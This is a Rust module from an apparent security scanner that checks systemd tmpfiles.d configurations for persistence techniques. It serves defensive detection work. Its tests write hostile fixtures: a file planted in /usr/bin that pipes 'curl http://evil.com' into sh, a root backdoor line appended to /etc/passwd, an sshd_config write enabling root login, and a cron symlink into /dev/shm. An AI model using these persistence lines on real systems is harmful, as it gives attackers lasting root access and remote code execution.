//! systemd-tmpfiles.d persistence mechanism check
//!
//! Scans `/etc/tmpfiles.d/*.conf` and `/usr/lib/tmpfiles.d/*.conf` for
//! suspicious entries that could be used as persistence mechanisms —
//! creating binaries in system dirs, writing to sensitive config files,
//! or creating symlinks to writable locations.

use crate::checks::IotCheck;
use protectinator_container::filesystem::ContainerFs;
use protectinator_core::{Finding, FindingSource, Severity};
use std::collections::HashSet;
use tracing::debug;

/// System binary directories — creating files here is highly suspicious
const SYSTEM_BIN_DIRS: &[&str] = &["/usr/bin", "/usr/sbin", "/bin", "/sbin"];

/// Sensitive config files — writing to these is highly suspicious
const SENSITIVE_CONFIG_PATHS: &[&str] = &[
    "/etc/passwd",
    "/etc/shadow",
    "/etc/sudoers",
    "/etc/ssh/",
];

/// Suspicious symlink targets
const SUSPICIOUS_SYMLINK_TARGETS: &[&str] = &["/tmp", "/dev/shm"];

/// Tmpfiles.d configuration directories
const TMPFILES_DIRS: &[(&str, bool)] = &[
    ("/etc/tmpfiles.d", false),           // Admin overrides — flag if suspicious
    ("/usr/lib/tmpfiles.d", true),        // Package defaults — info only
];

/// systemd-tmpfiles.d persistence check
pub struct TmpfilesPersistenceCheck;

impl IotCheck for TmpfilesPersistenceCheck {
    fn id(&self) -> &str {
        "iot-tmpfiles-persistence"
    }

    fn name(&self) -> &str {
        "Tmpfiles.d Persistence Check"
    }

    fn run(&self, fs: &ContainerFs) -> Vec<Finding> {
        let mut findings = Vec::new();

        // Build dpkg ownership set for /etc/tmpfiles.d files
        let dpkg_owned = collect_dpkg_owned_files(fs);

        for (dir, is_package_dir) in TMPFILES_DIRS {
            check_tmpfiles_dir(fs, dir, *is_package_dir, &dpkg_owned, &mut findings);
        }

        findings
    }
}

fn source(location: &str) -> FindingSource {
    FindingSource::Persistence {
        persistence_type: "tmpfiles_d".to_string(),
        location: location.to_string(),
    }
}

/// A parsed tmpfiles.d configuration line
#[derive(Debug)]
struct TmpfilesEntry {
    /// Type character: f, F, d, D, L, w, x, X, etc.
    entry_type: char,
    /// Target path
    path: String,
    /// Optional argument (e.g., symlink target for type L)
    argument: Option<String>,
    /// Source config file
    config_file: String,
    /// Raw line text
    raw_line: String,
}

/// Collect all file paths listed in /var/lib/dpkg/info/*.list
fn collect_dpkg_owned_files(fs: &ContainerFs) -> HashSet<String> {
    let mut owned = HashSet::new();

    let dpkg_info_dir = "/var/lib/dpkg/info";
    let entries = match fs.read_dir(dpkg_info_dir) {
        Ok(e) => e,
        Err(_) => {
            debug!("Cannot read dpkg info directory for tmpfiles ownership check");
            return owned;
        }
    };

    for entry in entries.flatten() {
        let name = entry.file_name();
        let name_str = name.to_string_lossy();

        if !name_str.ends_with(".list") {
            continue;
        }

        let list_path = format!("{}/{}", dpkg_info_dir, name_str);
        if let Ok(content) = fs.read_to_string(&list_path) {
            for line in content.lines() {
                let line = line.trim();
                if !line.is_empty() {
                    owned.insert(line.to_string());
                }
            }
        }
    }

    owned
}

/// Check a single tmpfiles.d directory
fn check_tmpfiles_dir(
    fs: &ContainerFs,
    dir: &str,
    is_package_dir: bool,
    dpkg_owned: &HashSet<String>,
    findings: &mut Vec<Finding>,
) {
    let entries = match fs.read_dir(dir) {
        Ok(e) => e,
        Err(_) => {
            debug!("Cannot read tmpfiles directory: {}", dir);
            return;
        }
    };

    for entry in entries.flatten() {
        let name = entry.file_name();
        let name_str = name.to_string_lossy();

        if !name_str.ends_with(".conf") {
            continue;
        }

        let config_path = format!("{}/{}", dir, name_str);
        let content = match fs.read_to_string(&config_path) {
            Ok(c) => c,
            Err(_) => continue,
        };

        // Check dpkg ownership for files in /etc/tmpfiles.d/
        if !is_package_dir && !dpkg_owned.contains(&config_path) {
            findings.push(
                Finding::new(
                    "iot-tmpfiles-persistence",
                    format!("Unowned tmpfiles.d config: {}", name_str),
                    format!(
                        "Configuration file '{}' is not owned by any dpkg package. \
                         Custom tmpfiles.d entries in /etc/ may be used for persistence.",
                        config_path
                    ),
                    Severity::Medium,
                    source(&config_path),
                )
                .with_resource(config_path.clone())
                .with_remediation(
                    "Verify this tmpfiles.d configuration is expected and review its contents.",
                )
                .with_reference("https://attack.mitre.org/techniques/T1037/"),
            );
        }

        // Parse and assess each line
        let parsed_entries = parse_tmpfiles_conf(&content, &config_path);
        for tmpfile_entry in &parsed_entries {
            assess_tmpfiles_entry(tmpfile_entry, is_package_dir, findings);
        }
    }
}

/// Parse a tmpfiles.d configuration file into entries
///
/// Format: `type path mode uid gid age argument`
/// Fields are whitespace-separated. The `argument` field is optional.
fn parse_tmpfiles_conf(content: &str, config_file: &str) -> Vec<TmpfilesEntry> {
    content
        .lines()
        .filter_map(|line| {
            let trimmed = line.trim();

            // Skip comments and empty lines
            if trimmed.is_empty() || trimmed.starts_with('#') {
                return None;
            }

            let fields: Vec<&str> = trimmed.split_whitespace().collect();
            if fields.len() < 2 {
                return None;
            }

            // The type field may have modifiers (e.g., "f+", "d!"), take first char
            let entry_type = fields[0].chars().next()?;
            let path = fields[1].to_string();

            // Argument is the 7th field (index 6) if present
            let argument = fields.get(6).map(|s| s.to_string());

            Some(TmpfilesEntry {
                entry_type,
                path,
                argument,
                config_file: config_file.to_string(),
                raw_line: trimmed.to_string(),
            })
        })
        .collect()
}

/// Assess a single tmpfiles.d entry for suspicious patterns
fn assess_tmpfiles_entry(
    entry: &TmpfilesEntry,
    is_package_dir: bool,
    findings: &mut Vec<Finding>,
) {
    match entry.entry_type {
        // f/F — create file
        'f' | 'F' => {
            if is_system_bin_path(&entry.path) {
                let severity = if is_package_dir {
                    Severity::Info
                } else {
                    Severity::Critical
                };

                findings.push(
                    Finding::new(
                        "iot-tmpfiles-persistence",
                        format!("Tmpfiles creating file in system binary dir: {}", entry.path),
                        format!(
                            "tmpfiles.d entry in '{}' creates a file at '{}' which is a \
                             system binary directory. This could be used to plant a backdoor \
                             that persists across reboots. Line: {}",
                            entry.config_file, entry.path, entry.raw_line
                        ),
                        severity,
                        source(&entry.config_file),
                    )
                    .with_resource(entry.config_file.clone())
                    .with_remediation(
                        "Review this tmpfiles.d entry. Files should not be created in \
                         system binary directories via tmpfiles.d.",
                    )
                    .with_reference("https://attack.mitre.org/techniques/T1543/"),
                );
            }
        }

        // w — write to existing file
        'w' => {
            if is_sensitive_config(&entry.path) {
                let severity = if is_package_dir {
                    Severity::Info
                } else {
                    Severity::Critical
                };

                findings.push(
                    Finding::new(
                        "iot-tmpfiles-persistence",
                        format!("Tmpfiles writing to sensitive config: {}", entry.path),
                        format!(
                            "tmpfiles.d entry in '{}' writes to sensitive file '{}'. \
                             This could be used to inject backdoor accounts or SSH keys. \
                             Line: {}",
                            entry.config_file, entry.path, entry.raw_line
                        ),
                        severity,
                        source(&entry.config_file),
                    )
                    .with_resource(entry.config_file.clone())
                    .with_remediation(
                        "Investigate this entry immediately. Writing to security-critical \
                         files via tmpfiles.d is a known persistence technique.",
                    )
                    .with_reference("https://attack.mitre.org/techniques/T1037/"),
                );
            }
        }

        // L — create symlink
        'L' => {
            if let Some(ref target) = entry.argument {
                if SUSPICIOUS_SYMLINK_TARGETS
                    .iter()
                    .any(|t| target.starts_with(t))
                {
                    let severity = if is_package_dir {
                        Severity::Info
                    } else {
                        Severity::High
                    };

                    findings.push(
                        Finding::new(
                            "iot-tmpfiles-persistence",
                            format!(
                                "Tmpfiles symlink to suspicious target: {} -> {}",
                                entry.path, target
                            ),
                            format!(
                                "tmpfiles.d entry in '{}' creates a symlink from '{}' pointing \
                                 to '{}'. Symlinks to /tmp or /dev/shm can be used for \
                                 symlink-based attacks. Line: {}",
                                entry.config_file, entry.path, target, entry.raw_line
                            ),
                            severity,
                            source(&entry.config_file),
                        )
                        .with_resource(entry.config_file.clone())
                        .with_remediation(
                            "Review this symlink. Verify the target is legitimate and not \
                             used for a symlink attack.",
                        )
                        .with_reference("https://attack.mitre.org/techniques/T1547/"),
                    );
                }
            }
        }

        // x/X — exclude from cleanup
        'x' | 'X' => {
            // Excluding suspicious paths from cleanup could hide persistence
            let is_suspicious = entry.path.starts_with("/tmp/.")
                || entry.path.starts_with("/dev/shm/")
                || entry.path.starts_with("/var/tmp/.")
                || SYSTEM_BIN_DIRS
                    .iter()
                    .any(|d| entry.path.starts_with(d));

            if is_suspicious {
                let severity = if is_package_dir {
                    Severity::Info
                } else {
                    Severity::Medium
                };

                findings.push(
                    Finding::new(
                        "iot-tmpfiles-persistence",
                        format!("Tmpfiles cleanup exclusion for suspicious path: {}", entry.path),
                        format!(
                            "tmpfiles.d entry in '{}' excludes '{}' from cleanup. \
                             Excluding hidden or sensitive paths from cleanup could be \
                             used to maintain persistence. Line: {}",
                            entry.config_file, entry.path, entry.raw_line
                        ),
                        severity,
                        source(&entry.config_file),
                    )
                    .with_resource(entry.config_file.clone())
                    .with_remediation(
                        "Review why this path is excluded from cleanup. Remove if not needed.",
                    )
                    .with_reference("https://attack.mitre.org/techniques/T1070/"),
                );
            }
        }

        // d/D — create directory (less suspicious but note in binary dirs)
        'd' | 'D' => {
            if is_system_bin_path(&entry.path) && !is_package_dir {
                findings.push(
                    Finding::new(
                        "iot-tmpfiles-persistence",
                        format!("Tmpfiles creating directory in system path: {}", entry.path),
                        format!(
                            "tmpfiles.d entry in '{}' creates a directory at '{}'. \
                             Line: {}",
                            entry.config_file, entry.path, entry.raw_line
                        ),
                        Severity::Medium,
                        source(&entry.config_file),
                    )
                    .with_resource(entry.config_file.clone()),
                );
            }
        }

        _ => {} // Other types not assessed
    }
}

/// Check if a path is in a system binary directory
fn is_system_bin_path(path: &str) -> bool {
    SYSTEM_BIN_DIRS
        .iter()
        .any(|d| path.starts_with(d))
}

/// Check if a path is a sensitive config file
fn is_sensitive_config(path: &str) -> bool {
    SENSITIVE_CONFIG_PATHS
        .iter()
        .any(|s| path.starts_with(s))
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;
    use tempfile::TempDir;

    fn setup_container(tmp: &TempDir) -> ContainerFs {
        ContainerFs::new(tmp.path())
    }

    #[test]
    fn test_detects_file_creation_in_bin_dir() {
        let tmp = TempDir::new().unwrap();
        let root = tmp.path();

        let etc_tmpfiles = root.join("etc/tmpfiles.d");
        fs::create_dir_all(&etc_tmpfiles).unwrap();
        fs::create_dir_all(root.join("var/lib/dpkg/info")).unwrap();

        // Suspicious: creating a file in /usr/bin
        fs::write(
            etc_tmpfiles.join("backdoor.conf"),
            "f /usr/bin/update-helper 0755 root root - #!/bin/bash\\ncurl http://evil.com|sh\n",
        )
        .unwrap();

        let cfs = setup_container(&tmp);
        let check = TmpfilesPersistenceCheck;
        let findings = check.run(&cfs);

        let bin_finding = findings
            .iter()
            .find(|f| f.title.contains("system binary dir") && f.title.contains("/usr/bin"));
        assert!(
            bin_finding.is_some(),
            "Should detect file creation in /usr/bin"
        );
        assert_eq!(bin_finding.unwrap().severity, Severity::Critical);
    }

    #[test]
    fn test_detects_write_to_sensitive_config() {
        let tmp = TempDir::new().unwrap();
        let root = tmp.path();

        let etc_tmpfiles = root.join("etc/tmpfiles.d");
        fs::create_dir_all(&etc_tmpfiles).unwrap();
        fs::create_dir_all(root.join("var/lib/dpkg/info")).unwrap();

        // Suspicious: writing to /etc/passwd
        fs::write(
            etc_tmpfiles.join("evil.conf"),
            "w /etc/passwd - - - - backdoor:x:0:0::/root:/bin/bash\n",
        )
        .unwrap();

        let cfs = setup_container(&tmp);
        let check = TmpfilesPersistenceCheck;
        let findings = check.run(&cfs);

        let passwd_finding = findings
            .iter()
            .find(|f| f.title.contains("sensitive config") && f.title.contains("/etc/passwd"));
        assert!(
            passwd_finding.is_some(),
            "Should detect write to /etc/passwd"
        );
        assert_eq!(passwd_finding.unwrap().severity, Severity::Critical);
    }

    #[test]
    fn test_detects_suspicious_symlink() {
        let tmp = TempDir::new().unwrap();
        let root = tmp.path();

        let etc_tmpfiles = root.join("etc/tmpfiles.d");
        fs::create_dir_all(&etc_tmpfiles).unwrap();
        fs::create_dir_all(root.join("var/lib/dpkg/info")).unwrap();

        // Suspicious: symlink pointing to /dev/shm
        fs::write(
            etc_tmpfiles.join("shady.conf"),
            "L /etc/cron.d/updater - - - - /dev/shm/payload\n",
        )
        .unwrap();

        let cfs = setup_container(&tmp);
        let check = TmpfilesPersistenceCheck;
        let findings = check.run(&cfs);

        let symlink_finding = findings
            .iter()
            .find(|f| f.title.contains("symlink") && f.title.contains("/dev/shm"));
        assert!(
            symlink_finding.is_some(),
            "Should detect suspicious symlink target"
        );
        assert_eq!(symlink_finding.unwrap().severity, Severity::High);
    }

    #[test]
    fn test_detects_unowned_config() {
        let tmp = TempDir::new().unwrap();
        let root = tmp.path();

        let etc_tmpfiles = root.join("etc/tmpfiles.d");
        fs::create_dir_all(&etc_tmpfiles).unwrap();

        // Create dpkg info with a .list that does NOT include our conf file
        let dpkg_dir = root.join("var/lib/dpkg/info");
        fs::create_dir_all(&dpkg_dir).unwrap();
        fs::write(
            dpkg_dir.join("systemd.list"),
            "/usr/lib/tmpfiles.d/systemd.conf\n",
        )
        .unwrap();

        // An innocent-looking but unowned config
        fs::write(
            etc_tmpfiles.join("custom.conf"),
            "d /var/log/myapp 0755 root root -\n",
        )
        .unwrap();

        let cfs = setup_container(&tmp);
        let check = TmpfilesPersistenceCheck;
        let findings = check.run(&cfs);

        let unowned = findings
            .iter()
            .find(|f| f.title.contains("Unowned tmpfiles.d config"));
        assert!(unowned.is_some(), "Should detect unowned config file");
        assert_eq!(unowned.unwrap().severity, Severity::Medium);
    }

    #[test]
    fn test_detects_cleanup_exclusion() {
        let tmp = TempDir::new().unwrap();
        let root = tmp.path();

        let etc_tmpfiles = root.join("etc/tmpfiles.d");
        fs::create_dir_all(&etc_tmpfiles).unwrap();
        fs::create_dir_all(root.join("var/lib/dpkg/info")).unwrap();

        // Excluding hidden tmp path from cleanup
        fs::write(
            etc_tmpfiles.join("persist.conf"),
            "x /tmp/.hidden_payload\n",
        )
        .unwrap();

        let cfs = setup_container(&tmp);
        let check = TmpfilesPersistenceCheck;
        let findings = check.run(&cfs);

        let exclusion = findings
            .iter()
            .find(|f| f.title.contains("cleanup exclusion"));
        assert!(
            exclusion.is_some(),
            "Should detect suspicious cleanup exclusion"
        );
        assert_eq!(exclusion.unwrap().severity, Severity::Medium);
    }

    #[test]
    fn test_package_dir_entries_are_info() {
        let tmp = TempDir::new().unwrap();
        let root = tmp.path();

        // Put suspicious content in the package directory (not admin override)
        let pkg_tmpfiles = root.join("usr/lib/tmpfiles.d");
        fs::create_dir_all(&pkg_tmpfiles).unwrap();
        fs::create_dir_all(root.join("var/lib/dpkg/info")).unwrap();

        fs::write(
            pkg_tmpfiles.join("suspicious-pkg.conf"),
            "f /usr/bin/something 0755 root root -\n",
        )
        .unwrap();

        let cfs = setup_container(&tmp);
        let check = TmpfilesPersistenceCheck;
        let findings = check.run(&cfs);

        let pkg_finding = findings
            .iter()
            .find(|f| f.title.contains("system binary dir") && f.title.contains("/usr/bin"));
        assert!(
            pkg_finding.is_some(),
            "Should still flag suspicious patterns in package dir"
        );
        // But at Info severity for package-owned dirs
        assert_eq!(pkg_finding.unwrap().severity, Severity::Info);
    }

    #[test]
    fn test_skips_comments_and_empty_lines() {
        let content = "\
# This is a comment
\n\
   # Another comment\n\
d /run/myapp 0755 root root -\n\
";

        let entries = parse_tmpfiles_conf(content, "/test.conf");
        assert_eq!(entries.len(), 1);
        assert_eq!(entries[0].entry_type, 'd');
        assert_eq!(entries[0].path, "/run/myapp");
    }

    #[test]
    fn test_detects_write_to_ssh_config() {
        let tmp = TempDir::new().unwrap();
        let root = tmp.path();

        let etc_tmpfiles = root.join("etc/tmpfiles.d");
        fs::create_dir_all(&etc_tmpfiles).unwrap();
        fs::create_dir_all(root.join("var/lib/dpkg/info")).unwrap();

        fs::write(
            etc_tmpfiles.join("ssh-backdoor.conf"),
            "w /etc/ssh/sshd_config - - - - PermitRootLogin yes\n",
        )
        .unwrap();

        let cfs = setup_container(&tmp);
        let check = TmpfilesPersistenceCheck;
        let findings = check.run(&cfs);

        let ssh_finding = findings
            .iter()
            .find(|f| f.title.contains("sensitive config") && f.title.contains("/etc/ssh"));
        assert!(
            ssh_finding.is_some(),
            "Should detect write to SSH config"
        );
        assert_eq!(ssh_finding.unwrap().severity, Severity::Critical);
    }
}
